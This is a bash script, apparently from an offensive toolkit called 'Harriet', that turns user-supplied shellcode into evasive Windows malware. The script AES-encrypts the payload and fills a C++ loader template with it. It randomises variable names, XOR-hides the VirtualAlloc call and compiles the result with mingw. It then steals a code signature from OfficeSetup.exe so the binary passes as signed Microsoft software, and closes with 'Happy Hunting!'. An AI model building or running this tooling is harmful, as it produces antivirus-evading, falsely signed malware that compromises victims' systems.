#!/bin/bash

# Color variables
red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
blue='\033[0;34m'
magenta='\033[0;35m'
cyan='\033[0;36m'
# Clear the color after that
clear='\033[0m'
cat << "EOF"
  ___        _                        _           _                      
 / _ \      | |                      | |         | |                     
/ /_\ \_   _| |_ ___  _ __ ___   __ _| |_ ___  __| |                     
|  _  | | | | __/ _ \| '_ ` _ \ / _` | __/ _ \/ _` |                     
| | | | |_| | || (_) | | | | | | (_| | ||  __/ (_| |                     
\_| |_/\__,_|\__\___/|_| |_| |_|\__,_|\__\___|\__,_|                     
                                                                         
                                                                         
  ___   _____ _____   _____                            _   _             
 / _ \ |  ___/  ___| |  ___|                          | | (_)            
/ /_\ \| |__ \ `--.  | |__ _ __   ___ _ __ _   _ _ __ | |_ _  ___  _ __  
|  _  ||  __| `--. \ |  __| '_ \ / __| '__| | | | '_ \| __| |/ _ \| '_ \ 
| | | || |___/\__/ / | |__| | | | (__| |  | |_| | |_) | |_| | (_) | | | |
\_| |_/\____/\____/  \____/_| |_|\___|_|   \__, | .__/ \__|_|\___/|_| |_|
                                            __/ | |                      
                                           |___/|_|                      
EOF

echo -e ${green}"Enter The Path To Your Shellcode File. ex: /home/user/Downloads/shellcode.bin"${clear}
echo ""
read Shellcode
echo ""
echo -e ${green}"Name Your Malware! ex: malware.exe"${clear}
echo ""
read MALWARE
echo ""
cp Harriet/FULLAes/xor.py Harriet/FULLAes/Resources/xor.py
cp Harriet/FULLAes/template.cpp Harriet/FULLAes/Resources/template.cpp
echo -e ${yellow}"+++Encrypting Payload+++" ${clear}
echo ""
sleep 2
python Harriet/FULLAes/Resources/aesencrypt.py $Shellcode > shell.txt
echo -e ${yellow}"***Encryption Completed***"${clear}
echo ""
cp shell.txt shell2.txt
#Generate AES Key
keys=$(cat "shell2.txt")
cut -d 'p' -f1 shell2.txt > shell3.txt
keys=$(cat shell3.txt)
keysnow=${keys#*=}
sed -i "s/KEYVALUE/$keysnow/g" Harriet/FULLAes/Resources/template.cpp

#Generate AES Payload
payload=$(cat "shell.txt")
payloadnow=${payload#*;}
payloadtoday=${payloadnow#*=}
echo $payloadtoday > shell5.txt
perl -pe 's/PAYVAL/`cat shell5.txt`/ge' -i Harriet/FULLAes/Resources/template.cpp
sleep 2

cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-8} | head -n 1 > shell.txt
Random1=$(cat shell.txt)
sed -i "s/Random1/$Random1/g" Harriet/FULLAes/Resources/template.cpp

cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-10} | head -n 1 > shell.txt
Random2=$(cat shell.txt)
sed -i "s/Random2/$Random2/g" Harriet/FULLAes/Resources/template.cpp

cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-19} | head -n 1 > shell.txt
Random3=$(cat shell.txt)
sed -i "s/Random3/$Random3/g" Harriet/FULLAes/Resources/template.cpp

cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-16} | head -n 1 > shell.txt
Random4=$(cat shell.txt)
sed -i "s/Random4/$Random4/g" Harriet/FULLAes/Resources/template.cpp

cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-14} | head -n 1 > shell.txt
Random5=$(cat shell.txt)
sed -i "s/Random5/$Random5/g" Harriet/FULLAes/Resources/template.cpp

cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-5} | head -n 1 > shell.txt
Random6=$(cat shell.txt)
sed -i "s/Random6/$Random6/g" Harriet/FULLAes/Resources/template.cpp

cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-4} | head -n 1 > shell.txt
Random7=$(cat shell.txt)
sed -i "s/Random7/$Random7/g" Harriet/FULLAes/Resources/template.cpp

cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-2} | head -n 1 > shell.txt
Random8=$(cat shell.txt)
sed -i "s/Random8/$Random8/g" Harriet/FULLAes/Resources/template.cpp

#VIRTUALALLOC VARIABLE NAME
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-11} | head -n 1 > shell.txt
Random9=$(cat shell.txt)
sed -i "s/Random9/$Random9/g" Harriet/FULLAes/Resources/template.cpp

#XOR FUNCTION VARIABLE NAME
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-11} | head -n 1 > shell.txt
RandomA=$(cat shell.txt)
sed -i "s/RandomA/$RandomA/g" Harriet/FULLAes/Resources/template.cpp

#XOR KEY VALUE
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-15} | head -n 1 > shell.txt
XOR_KEY=$(cat shell.txt)
sed -i "s/XOR_KEY/$XOR_KEY/g" Harriet/FULLAes/Resources/template.cpp
sed -i "s/XOR_KEY/$XOR_KEY/g" Harriet/FULLAes/Resources/xor.py

#XOR KEY VARIABLE
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-17} | head -n 1 > shell.txt
XOR_VARIABLE=$(cat shell.txt)
sed -i "s/XOR_VARIABLE/$XOR_VARIABLE/g" Harriet/FULLAes/Resources/template.cpp
rm shell.txt

#VIRTUALALLOC - XOR String
echo VirtualAlloc > virt.txt
python Harriet/FULLAes/Resources/xor.py virt.txt > virtalloc.txt
virt=$(cat virtalloc.txt)
virt2="${virt::-8}" 
sed -i "s/VIRALO/$virt2/g" Harriet/FULLAes/Resources/template.cpp 
rm virt*

echo -e ${yellow}"+++Compiling Malware+++"${clear}
x86_64-w64-mingw32-g++ -o $MALWARE Harriet/FULLAes/Resources/template.cpp -fpermissive -Wno-narrowing >/dev/null 2>&1
echo ""
sleep 2
rm shell*
echo -e ${yellow}"***Malware Compiled***"${clear}
echo ""
sleep 2
echo -e ${yellow}"+++Adding Binary Signature+++"${clear}
echo ""
sleep 2
python3 Harriet/Resources/SigThief/sigthief.py -i Harriet/Resources/OfficeSetup.exe -t $MALWARE -o signed$MALWARE >/dev/null 2>&1
mv signed$MALWARE $MALWARE
echo -e ${yellow}"***Signature Added. Happy Hunting!**"${clear}
echo ""
